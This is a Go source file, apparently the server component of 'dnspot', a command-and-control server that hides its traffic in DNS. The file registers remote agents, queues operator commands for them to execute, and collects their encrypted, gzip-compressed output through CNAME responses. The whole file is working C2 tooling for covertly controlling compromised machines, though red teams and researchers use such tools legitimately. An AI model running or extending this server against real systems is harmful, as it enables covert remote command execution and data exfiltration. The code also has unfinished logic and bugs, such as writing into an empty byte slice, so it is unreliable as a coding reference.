package server

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"math"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/cryptography"
)

// Server contains all the runtime configuration of a dnspot Command and Control server
type Server struct {
	PrivateKeyBase36         string
	privateKey               *cryptography.PrivateKey
	ListenAddress            string
	EnforceClientKeys        bool
	AcceptedClientKeysBase36 []string
	acceptedClientKeys       *[]cryptography.PublicKey
	DNSSuffix                string
	Mode                     string
	connectedAgents          map[cryptography.PublicKeyStr]agentStatusForServer
	io                       IO
	// dedupPrevMsgHash is only for consecutive message duplicates
	dedupPrevMsgHash uint64
}

// log levels
const (
	DEBUG = uint8(iota)
	INFO
	WARN
	ERR
	FATAL
)

// InMsg is a message coming from the frontend
type InMsg struct {
	Prompt string
	Agent  string
}

// IO provides a common interface to work with dnspot. Any CLI/Web/WASM app can deploy the 4 functions and act as a frontend
// for dnspot server
type IO interface {
	Logger(level uint8, format string, args ...interface{})
	GetInputFeed() chan InMsg
	GetOutputFeed() chan string
	GetContext() context.Context
}

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MsgType
	NextParentPartID                c2.PartID
	HealthCheckIntervalMilliSeconds uint32
	InBuffer                        map[c2.PartID][]c2.MessagePacketWithSignature
	OutBuffer                       map[c2.PartID][]string
}

// New returns a new Server object
func New() Server {
	s := Server{}
	s.connectedAgents = make(map[cryptography.PublicKeyStr]agentStatusForServer)
	return s
}

// ListAgents returns a list of agents connected to the server
func (s Server) ListAgents() []string {
	// return a deduplicated list of agents
	agents := make([]string, 0)
	for k := range s.connectedAgents {
		agents = append(agents, string(k))
	}
	return agents
}

// log received healthcheck. if the agent is due to run a task, the server's response
// to the healthcheck will become different.
func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	s.io.Logger(INFO, "Healthcheck, coming from %s", Packet.Signature.String())
	//register new agent in agent list
	agent, ok := s.connectedAgents[Packet.Signature.String()]
	if !ok {
		s.io.Logger(INFO, "Registering new agent in our Connected Agent List, %d agent(s) are connected", len(s.connectedAgents)+1)
		s.connectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
			InBuffer:                        make(map[c2.PartID][]c2.MessagePacketWithSignature),
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	// create the incoming buffer if it doesn't exist
	if agent.InBuffer == nil {
		agent.InBuffer = make(map[c2.PartID][]c2.MessagePacketWithSignature)
	}
	s.connectedAgents[Packet.Signature.String()] = agent
	switch agent.NextMessageType {
	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
			s.io.Logger(WARN, "Time difference between server and agent is more than 10 seconds. This is not acceptable. Agent: %s, Server: %s", time.Unix(int64(Packet.Msg.TimeStamp), 0).Format("2006-01-02T15:04:05-0700"), time.Now().Format("2006-01-02T15:04:05-0700"))
		}
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		s.io.Logger(INFO, "preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
		if err != nil {
			s.io.Logger(ERR, "Error preparing a response for a healthcheck message: %s", err.Error())
			return err
		}

		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				s.io.Logger(WARN, "%s", err)
			}
			q.Answer = append(q.Answer, cname)
		}
		// this only happens when we're switching mode. after this one, the rest of the requests
		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
	case c2.MessageExecuteCommand:
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		// first check to see if this is a residual packet from a previous multi-part convo
		if len(agent.OutBuffer[agent.NextParentPartID]) == 0 {
			return nil
		}

		// the last 0 in the index means that in response to any healthcheck, we will start with the first packet of the new conversation
		// the rest should be handled by a response to this particular CNAME, hence not being part of a healtcheck response
		cnameQ := fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][0])
		cname, err := dns.NewRR(cnameQ)
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

// shows the output of any command run by agent and sent back to us.
func (s *Server) displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey) {
	out := bytes.Trim(fullPayload, "\x00")
	if c2.FNV1A(out) == uint64(s.dedupPrevMsgHash) {
		return
	}
	s.dedupPrevMsgHash = c2.FNV1A(out)
	rdata := bytes.NewReader(out)
	r, err := gzip.NewReader(rdata)
	if err == nil {
		out, _ = io.ReadAll(r)
	}
	s.io.GetOutputFeed() <- fmt.Sprintf("[%s]: %s", signature.String(), out)
}

func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent, ok := s.connectedAgents[Packet.Signature.String()]
	if !ok {
		s.io.Logger(ERR, "agent not recognized")
	}
	// handle multipart incoming
	agent.InBuffer[Packet.Msg.ParentPartID] = append(agent.InBuffer[Packet.Msg.ParentPartID], Packet)
	// if Packet.Msg.ParentPartID != 0 { // multi part
	//fist and middle packets
	msg := c2.MessagePacket{
		TimeStamp:    uint32(time.Now().Unix()),
		MessageType:  c2.MessageExecuteCommandResponse,
		ParentPartID: Packet.Msg.ParentPartID,
		PartID:       Packet.Msg.PartID,
	}
	payload := []byte("Ack!")
	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
		msg.IsLastPart = true
		agent.NextMessageType = c2.MessageHealthcheck
		s.connectedAgents[Packet.Signature.String()] = agent
		payload = []byte("Ack! Last Part")
	}
	// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
	// time.Sleep(2 * time.Second)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
		q.Answer = append(q.Answer, cname)
	}

	// we're not in the last message, and the parentID is not 0, so this is a multi-part
	// message and we're in the middle of it, there's no payload yet. we need to send an ack
	// as we done above, and wait for the next packet to come in and add it to the buffer
	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
		return nil
	}

	fullPayload := make([]byte, 0)
	packets := c2.CheckMessageIntegrity(agent.InBuffer[Packet.Msg.ParentPartID])
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// TODO: how do we acknowledge that we're done here and we both go back to healthcheck?
	// remove the buffer from memory
	s.displayCommandResult(fullPayload, Packet.Signature)

	s.io.Logger(DEBUG, "cleaning up buffer for %s", Packet.Signature.String())
	// delete(agent.IncomingMessageBuffer, ParentPartID(Packet.Msg.ParentPartID))
	delete(agent.OutBuffer, Packet.Msg.ParentPartID)
	// sometimes the multipart messages also have a message with parent ID 0, which needs to be cleaned up
	delete(agent.OutBuffer, c2.PartID(0))

	return nil
}

func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
	// As part of the incoming packet, we'll get the partid as well as parentPartID so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartID, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
	//todo: what are we getting from the client? let's decrypt and log those

	agent := s.connectedAgents[agentPublicKey.String()]

	// check to see if the parent key exists first in case an agent disappears
	if _, ok := agent.OutBuffer[parentPartID]; !ok {
		if targetBuffer, ok := agent.OutBuffer[parentPartID]; ok {
			if parentPartID == 0 {
				s.io.Logger(INFO, "key and ParentPartId already exist in the buffer, overwriting...")
				agent.OutBuffer = make(map[c2.PartID][]string)
				agent.OutBuffer[parentPartID] = append(agent.OutBuffer[parentPartID], Answers[0])
			}

		} else {
			//initialize the map
			agent.OutBuffer = make(map[c2.PartID][]string)
			targetBuffer = append(targetBuffer, Answers...)
			agent.OutBuffer[parentPartID] = targetBuffer
		}
	}
	s.io.Logger(INFO, "command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent.NextMessageType = msgPacket.MessageType
	agent.NextParentPartID = parentPartID
	s.connectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
// the input of this function comes directly from TUI input field. it was renamed
// because it'll now consider they message type as a configuration item and
// can provide command execution as well as chat.
func (s *Server) sendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {

	var cmdType c2.CmdType
	if s.Mode == "chat" {
		cmdType = c2.CommandEcho
	}
	if s.Mode == "exec" {
		cmdType = c2.CommandExec
	}
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
		Command:     cmdType,
	}
	return s.mustSendMsg(msg, agentPublicKey, command)
}

func (s *Server) messageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := s.connectedAgents[Packet.Signature.String()]
	acknowledgedID := Packet.Msg.PartID
	// handle last packet ID
	// NOTE: this makes no sense?
	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
		return nil
	}
	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(agent.OutBuffer, agent.NextParentPartID)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
	if err != nil {
		s.io.Logger(WARN, "%s", err)
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	// Config.io.Logger(INFO,"sending chat message '%s' to the client", command)
	//msg := c2.MessagePacket{
	//	TimeStamp:   uint32(time.Now().Unix()),
	//	MessageType: c2.MessageChat,
	//}
	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
	return nil
}

func (s *Server) messageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	// we only get this when the message's last part have been received and parsed.
	// just need to switch back the agent to healthcheck mode
	agent := s.connectedAgents[Packet.Signature.String()]
	agent.NextMessageType = c2.MessageHealthcheck
	s.connectedAgents[Packet.Signature.String()] = agent

	return nil

}

// remove idle agents after 60 seconds
func (s *Server) removeIdleAgents() {
	s.io.Logger(INFO, "Removing idle agents")
	for k, v := range s.connectedAgents {
		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
		if idleTime > 60 {
			s.io.Logger(INFO, "removing agent %s since it has been idle for %d seconds", k, idleTime)
			delete(s.connectedAgents, k)
			// for i := range UiAgentList.FindItems(k, "", false, true) {
			// 	UiAgentList.RemoveItem(i)
			// }
		}
	}
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func (s *Server) handleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := s.connectedAgents[Packet.Signature.String()]
	acknowledgedID := Packet.Msg.PartID
	// handle last packet ID
	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
		return nil
	}
	if Packet.Msg.IsLastPart {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(agent.OutBuffer, agent.NextParentPartID)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
	if err != nil {
		s.io.Logger(WARN, "%s", err)
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	return nil
}

func (s *Server) messageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func (s *Server) parseQuery(m *dns.Msg) error {
	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
	// moved this to decrypt incoming packet
	// if !c2.DedupHashTable.Add([]byte(m.Question[0].Name)) {
	// 	Config.io.Logger(INFO, "Duplicate message received, discarding")
	// 	return nil
	// }
	outs, skip, err := c2.DecryptIncomingPacket(m, s.DNSSuffix, s.privateKey, nil)
	if err != nil {
		s.io.Logger(INFO, "Error in Decrypting incoming packet: %v", err)
	}
	if !skip {
		for _, o := range outs {
			switch msgType := o.Msg.MessageType; msgType {
			case c2.MessageHealthcheck:
				return s.messageHealthcheckHandler(o, m)
			case c2.MessageExecuteCommand:
				return s.handleRunCommandAckFromAgent(o, m)
			case c2.MessageExecuteCommandResponse:
				return s.handleExecuteCommandResponse(o, m)
			case c2.MessageSetHealthInterval:
				return nil //
			case c2.MessageSyncTime:
				return nil // automatically done as part of routine healthcheck
			}
		}
	}

	// }
	//todo: prepare response
	return nil
}

func (s *Server) handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := s.parseQuery(m)
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
	}
	if err := w.WriteMsg(m); err != nil {
		s.io.Logger(WARN, "%s", err)
	}
}

func (s *Server) runDNS(ctx context.Context) error {

	dns.HandleFunc(".", s.handle53)

	// start server
	server := &dns.Server{Addr: s.ListenAddress, Net: "udp"}

	go func() {
		<-ctx.Done()
		server.Shutdown()
	}()

	s.io.Logger(INFO, "Started DNS on %s -- listening", server.Addr)
	return server.ListenAndServe()
}

// returns the first item of an arbitrary map
func first(m map[cryptography.PublicKeyStr]agentStatusForServer) (out cryptography.PublicKeyStr) {
	for k := range m {
		out = k
		break
	}
	// this should be unreachable
	return
}

// RunServer creates a new Server instance. This function is blocking and follows the "ListenAndServe" model
func (s *Server) RunServer(serverIO IO) error {
	s.io = serverIO

	// set global flag that we're running as server
	var err error
	s.privateKey, err = cryptography.PrivateKeyFromString(s.PrivateKeyBase36)
	if err != nil {
		return err
	}

	s.io.Logger(INFO, "Use the following public key to connect agents: %s", s.privateKey.GetPublicKey().String())

	// TODO: enable allowing only a set of public keys to connect

	if !strings.HasSuffix(s.DNSSuffix, ".") {
		s.DNSSuffix = s.DNSSuffix + "."
	}
	if !strings.HasPrefix(s.DNSSuffix, ".") {
		s.DNSSuffix = "." + s.DNSSuffix
	}

	dnsErrChan := make(chan error)
	go func() {
		dnsErrChan <- s.runDNS(s.io.GetContext())
	}()

	for {
		select {
		case text := <-s.io.GetInputFeed():
			if len(text.Prompt) > 0 {
				agent, _ := cryptography.PublicKeyFromString(cryptography.PublicKeyStr(text.Agent))
				err = s.sendMessageToAgent(agent, text.Prompt)
				if err != nil {
					s.io.Logger(WARN, "%s", err)
				} else {
					s.io.Logger(DEBUG, "Sent message to %s", text.Agent)
				}
			}
		case <-s.io.GetContext().Done():
			s.io.Logger(INFO, "Context cancelled, shutting down")
			return nil
		case err := <-dnsErrChan:
			return err
		}
	}

}
